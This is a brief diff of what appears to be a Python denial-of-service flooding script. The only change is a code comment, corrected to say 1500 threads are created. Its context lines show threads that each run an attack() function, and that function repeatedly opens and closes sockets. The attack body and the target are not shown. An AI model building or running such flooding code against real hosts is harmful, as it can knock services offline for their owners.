@@ -20,6 +20,6 @@ def attack(): #this function will be running in each of the individual threads
 
         s.close() #at the end of each loop, the socket is closed
         
-for i in range(1500): #this loop will create 500 threads
+for i in range(1500): #this loop will create 1500 threads
     thread = threading.Thread(target=attack) #each thread will run the attack function
     thread.start() #the thread is started
